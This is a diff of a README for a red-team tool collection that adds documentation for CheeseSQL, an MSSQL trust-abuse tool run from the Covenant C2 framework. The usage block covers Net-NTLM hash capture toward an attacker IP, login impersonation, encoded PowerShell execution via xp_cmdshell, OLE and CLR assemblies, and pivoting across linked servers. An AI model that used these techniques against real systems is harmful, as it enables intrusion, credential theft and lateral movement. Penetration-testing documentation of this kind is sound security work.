@@ -146,12 +146,79 @@ Actions:
 
 _Note: If executed without options, the program will try to inject in an active mstsc.exe process (the default wait time is 10 seconds)_
 
+## CheeseSQL
+Command Exec / Lateral Movement via MSSQL Trust. 
+This tool has been developed to overcome some of the limitations given by already existing tools like [esc](https://github.com/NetSPI/ESC), mostly regarding MSSQL impersonation.
+Moreover, CheeseSQL has been specifically modified to run from Covenant (via reflective loading), and to automate the most important phases of MSSQL trust abuse.
+Particuarly niche is the implementation of the CLR abuse, which allow a user to compile and upload a MSSQL extension on the fly with Roselyin to achive command execution.
+A very little demo is shown below, the command executed is an encoded PowerShell Covenant downloader):
+
+![CheeseSQL CLR Attack](./assests/cheesesql-clr.gif)
+
+Following my rule of "always give credit when credit is due", this tool has been developed starting from an already existing project 
+by [Jb05s](https://github.com/Jb05s), called [SharpSQL](https://github.com/Jb05s/SharpCollection/tree/master/SharpSQL), so big shout out to Jeremy for his work.
+
+Also, I really recommend to see all the tools from [NetSPI](https://twitter.com/netspi) regarding MSSQL auditing and exploitation, as they are really amazing:
+
+- [esc](https://github.com/NetSPI/ESC): interactive .NET SQL console client with enhanced SQL Server discovery, access, and data exfiltration features
+- [DAFT](https://github.com/NetSPI/DAFT): database auditing and assessment toolkit written in C#
+- [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL): PowerSHell module for SQL Server discovery, auditing, and exploitation
+
+```
+Usage:
+[*] findspn
+  Description: Find MSSQL Instances, using Domain SPNs
+  Usage: CheeseSQL findspn /ldapPath:LDAP_PATH /account:FILTER /computer
+[*] gethash
+  Description: Retrieve Net-NTLM Hash for Service Account from a directly accessible DB or Linked SQL Server
+  Usage: CheeseSQL gethash /db:DATABASE /server:SERVER /ip:ATTACKERIP /target:SERVER [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
+[*] getlogin
+  Description: Retrieve SQL Logins Available for Impersonation
+  Usage: CheeseSQL getlogin /db:DATABASE /server:SERVER [/impersonate:USER] [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
+[*] getdbuser
+  Description: Retrieve Information on the SQL Login, Currently Mapped User, and Available User Roles
+  Usage: CheeseSQL getdbuser /db:DATABASE /server:SERVER [/impersonate:USER] [/permissions] [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
+[*] getlinked
+  Description: Retrieve Linked Servers
+  Usage: CheeseSQL getlinked /db:DATABASE /server:SERVER [/verbose] [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
+[*] getlinkedlogin
+  Description: Retrieve SQL Logins Available for Impersonation on Linked SQL Servers
+  Usage: CheeseSQL getlinkedlogin /db:DATABASE /server:SERVER /target:TARGET [/impersonate:USER] [/impersonate-linked:USER] [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
+[*] getlinkeddbuser
+  Description: Retrieve user information on Linked SQL Servers
+  Usage: CheeseSQL getlinkeddbuser /db:DATABASE /server:SERVER /target:TARGET [/permissions] [/impersonate:USER] [/impersonate-linked:USER] [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
+[*] dbllinkedlogin
+  Description: Get Login Information on Doubly Linked SQL Server
+  Usage: CheeseSQL dbllinkedlogin /db:DATABASE /server:SERVER /intermediate:INTERMEDIATE [/impersonate:USER] [/impersonate-intermediate:USER] [/impersonate-linked:USER] /target:TARGET [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
+[*] xp
+  Description: Execute Encoded PowerShell Command via 'xp_cmdshell'
+  Usage: CheeseSQL xp /db:DATABASE /server:SERVER /command:COMMAND [/impersonate:USER] [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
+[*] ole
+  Description: Execute Encoded PowerShell Command via 'sp_OACreate' and 'sp_OAMethod'
+  Usage: CheeseSQL ole /db:DATABASE /server:SERVER /command:COMMAND [/impersonate:USER] [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
+[*] clr
+  Description: Execute Encoded PowerShell Command via custom CLR assembly
+  Usage: CheeseSQL clr /db:DATABASE /server:SERVER /command:COMMAND /assembly:DLL /class:CLASS /method:METHOD [/compile] [/impersonate:USER] [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
+[*] rpc
+  Description: Configure Linked SQL Server to Allow RPC connections
+  Usage: CheeseSQL rpc /db:DATABASE /server:SERVER /target:TARGET [/impersonate:(USER|LOGIN):USER] [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
+[*] linkedxp
+  Description: Execute Encoded PowerShell Command on Linked SQL Server via 'xp_cmdshell'
+  Usage: CheeseSQL linkedxp /db:DATABASE /server:SERVER /target:TARGET /command:COMMAND [/impersonate:USER] [/impersonate-linked:USER] [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
+[*] linkedquery
+  Description: Execute Encoded PowerShell Command on Linked SQL Server via 'OPENQUERY'
+  Usage: CheeseSQL linkedquery /db:DATABASE /server:SERVER /target:TARGET /command:COMMAND /impersonate:USER /impersonate-linked:USER [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
+[*] dbllinkedxp
+  Description: Execute Encoded PowerShell Command on Doubly Linked SQL Server via 'xp_cmdshell'
+  Usage: CheeseSQL dbllinkedxp /db:DATABASE /server:SERVER /intermediate:INTERMEDIATE [/impersonate:USER] [/impersonate-intermediate:USER] [/impersonate-linked:USER] /target:TARGET /command:COMMAND [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
+```
+
 ## Credits
 - [MiscTool][1] by [rasta-mouse](https://github.com/rasta-mouse)
 - [AmsiBypass][6] by [0xB455](https://github.com/0xB455)
 - [RdpThief][8] by [0x90AL](https://github.com/0x09AL)
 - [SharpRDPThief][9] by [passthehashbrowns](https://github.com/passthehashbrowns)
-
+- [SharpSQL](https://github.com/Jb05s/SharpCollection/tree/master/SharpSQL) by [Jb05s](https://github.com/Jb05s)
 
 [1]: https://github.com/rasta-mouse/MiscTools
 [2]: https://rastamouse.me/2018/10/amsiscanbuffer-bypass---part-1/
